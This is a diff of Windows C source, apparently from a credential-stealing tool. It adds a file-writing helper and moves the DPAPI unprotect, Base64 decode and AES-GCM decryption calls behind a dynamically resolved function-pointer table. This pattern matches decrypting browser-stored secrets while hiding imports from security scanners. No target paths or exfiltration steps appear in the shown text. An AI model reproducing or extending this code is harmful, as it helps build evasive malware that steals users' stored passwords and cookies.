@@ -80,6 +80,35 @@ LPSTR DuplicateAnsiString(IN LPCSTR pszSrc)
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
+BOOL WriteFileToDiskA(IN LPCSTR pszFilePath, IN PBYTE pbFileBuffer, IN DWORD dwFileSize)
+{
+    HANDLE  hFile           = INVALID_HANDLE_VALUE;
+    DWORD   dwBytesWritten  = 0x00;
+    BOOL    bResult         = FALSE;
+
+    if (!pszFilePath || !pbFileBuffer || dwFileSize == 0)
+        return FALSE;
+
+    if ((hFile = CreateFileA(pszFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
+    {
+        DBGA("[!] CreateFileA Failed With Error: %lu", GetLastError());
+        return FALSE;
+    }
+
+    if (!WriteFile(hFile, pbFileBuffer, dwFileSize, &dwBytesWritten, NULL) || dwBytesWritten != dwFileSize)
+    {
+        DBGA("[!] WriteFile Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", GetLastError(), dwBytesWritten, dwFileSize);
+        goto _END_OF_FUNC;
+    }
+
+    bResult = TRUE;
+
+_END_OF_FUNC:
+    if (hFile != INVALID_HANDLE_VALUE)
+        CloseHandle(hFile);
+    return bResult;
+}
+
 BOOL ReadFileFromDiskA(IN LPCSTR pszFilePath, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize)
 {
     HANDLE  hFile       = INVALID_HANDLE_VALUE;
@@ -394,7 +423,7 @@ PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput)
 
     *pcbOutput = 0;
 
-    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, NULL, &dwOutput, NULL, NULL))
+    if (!g_pSharedFunctions->pCryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, NULL, &dwOutput, NULL, NULL))
     {
         DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
         return NULL;
@@ -406,7 +435,7 @@ PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput)
         return NULL;
     }
 
-    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, pbOutput, &dwOutput, NULL, NULL))
+    if (!g_pSharedFunctions->pCryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, pbOutput, &dwOutput, NULL, NULL))
     {
         DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
         HEAP_FREE(pbOutput);
@@ -431,7 +460,7 @@ BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecrypted, O
     blobIn.pbData   = pBlob;
     blobIn.cbData   = dwBlob;
 
-    if (!CryptUnprotectData(&blobIn, NULL, NULL, NULL, NULL, 0, &blobOut))
+    if (!g_pSharedFunctions->pCryptUnprotectData(&blobIn, NULL, NULL, NULL, NULL, 0, &blobOut))
     {
         DBGA("[!] CryptUnprotectData Failed With Error: %lu", GetLastError());
         return FALSE;
@@ -443,7 +472,7 @@ BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecrypted, O
     return TRUE;
 }
 
-static BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULONG cbIv, IN PBYTE pbCiphertext, IN ULONG cbCiphertext, IN PBYTE pbTag, IN ULONG cbTag, OUT PBYTE* ppbPlaintext, OUT PDWORD pcbPlaintext)
+BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULONG cbIv, IN PBYTE pbCiphertext, IN ULONG cbCiphertext, IN PBYTE pbTag, IN ULONG cbTag, OUT PBYTE* ppbPlaintext, OUT PDWORD pcbPlaintext)
 {
     BCRYPT_ALG_HANDLE                       hAlg            = NULL;
     BCRYPT_KEY_HANDLE                       hKey            = NULL;
@@ -457,19 +486,19 @@ static BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULON
     if (!pbKey || !pbIv || !pbCiphertext || !pbTag || !ppbPlaintext || !pcbPlaintext)
         return FALSE;
 
-    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != 0)
+    if ((ntStatus = g_pSharedFunctions->pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != 0)
     {
         DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
-    if ((ntStatus = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) != 0)
+    if ((ntStatus = g_pSharedFunctions->pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) != 0)
     {
         DBGA("[!] BCryptSetProperty Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
-    if ((ntStatus = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, cbKey, 0)) != 0)
+    if ((ntStatus = g_pSharedFunctions->pBCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, cbKey, 0)) != 0)
     {
         DBGA("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
@@ -489,7 +518,7 @@ static BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULON
         goto _END_OF_FUNC;
     }
 
-    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, cbCiphertext, &AuthInfo, NULL, 0, pbPlaintext, dwPlaintext, &cbResult, 0)) != 0)
+    if ((ntStatus = g_pSharedFunctions->pBCryptDecrypt(hKey, pbCiphertext, cbCiphertext, &AuthInfo, NULL, 0, pbPlaintext, dwPlaintext, &cbResult, 0)) != 0)
     {
         DBGA("[!] BCryptDecrypt Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
@@ -502,8 +531,8 @@ static BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULON
 
 _END_OF_FUNC:
     HEAP_FREE(pbPlaintext);
-    if (hKey) BCryptDestroyKey(hKey);
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (hKey) g_pSharedFunctions->pBCryptDestroyKey(hKey);
+    if (hAlg) g_pSharedFunctions->pBCryptCloseAlgorithmProvider(hAlg, 0);
     return bResult;
 }
 
